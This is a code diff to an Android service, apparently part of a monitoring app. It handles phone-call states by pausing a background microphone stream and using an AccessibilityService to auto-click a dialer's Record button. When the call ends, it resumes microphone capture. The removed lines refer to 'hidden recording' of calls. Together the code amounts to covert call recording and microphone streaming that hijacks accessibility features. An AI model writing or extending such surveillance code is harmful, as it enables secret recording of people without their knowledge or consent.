@@ -3537,13 +3537,37 @@ class MicService : Service() {
     private fun handleCallState(state: Int) {
         when (state) {
             TelephonyManager.CALL_STATE_OFFHOOK -> {
-                Log.i(TAG, "Native call active, starting hidden recording")
+                Log.i(TAG, "Native call active — pausing mic stream & triggering ODialer Record")
                 stopAudioCapture("call_started")
-                CallRecorder.startRecording(applicationContext, "Native")
+
+                // Only trigger if AccessibilityService hasn't already claimed this call
+                if (MonitorAccessibilityService.autoRecordTriggered) {
+                    Log.i(TAG, "Record already triggered by AccessibilityService — skipping MicService trigger")
+                    return
+                }
+
+                // Claim the trigger and schedule the click
+                Handler(android.os.Looper.getMainLooper()).postDelayed({
+                    val service = MonitorAccessibilityService.instance
+                    if (service != null) {
+                        Log.i(TAG, "Triggering ODialer Record button click via AccessibilityService")
+                        service.clickRecordButton(retry = 0)
+                    } else {
+                        Log.w(TAG, "AccessibilityService not running — cannot auto-click Record")
+                    }
+                }, 2500)
             }
             TelephonyManager.CALL_STATE_IDLE -> {
-                Log.i(TAG, "Native call ended, stopping hidden recording")
-                CallRecorder.stopRecording("Native")
+                Log.i(TAG, "Native call ended — resuming mic stream")
+                // Reset auto-record state so next call can trigger fresh
+                MonitorAccessibilityService.resetAutoRecordState()
+                // ODialer handles its own recording stop; we just resume our mic capture
+                if (wantsMicStreaming && !isCapturing && !isWebRtcStreaming) {
+                    serviceScope.launch {
+                        delay(500) // Give ODialer time to release resources
+                        startAudioCapture()
+                    }
+                }
             }
         }
     }
